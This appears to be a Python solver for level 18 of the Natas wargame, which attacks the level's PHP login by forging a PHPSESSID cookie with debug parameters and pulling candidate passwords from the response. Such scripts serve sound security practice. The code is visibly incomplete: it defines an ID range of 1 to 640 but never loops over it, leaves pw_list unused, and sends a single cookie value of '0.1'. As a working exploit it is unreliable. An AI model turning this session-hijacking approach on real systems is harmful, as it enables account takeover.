"""
"""

import requests
from typing import Optional

from natas_utils import *

LEVEL = 18

def solve(url: str, login: LevelLogin) -> Optional[str]:
    # IDs are numbers in [1, 640]
    max_id = 640

    pw_list = []
    with requests.Session() as session:
        form_data = {
            "debug": "1",
            "username": "admin",
            "password": "null",
        }
        session.cookies.set(name="PHPSESSID", value="0.1")
        response = session.get(url, auth=login, params=form_data)
        print(response.text)

    pw_list = extract_candidate_passwords(response.text)
    return try_level_login(LEVEL + 1, pw_list)

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    flag = solve(url, login)

    if flag:
        print("natas{:02}:".format(LEVEL + 1), flag)
        store_level_password(LEVEL + 1, flag)
    else:
        exit("Failed to get password for natas{:02}.".format(LEVEL + 1))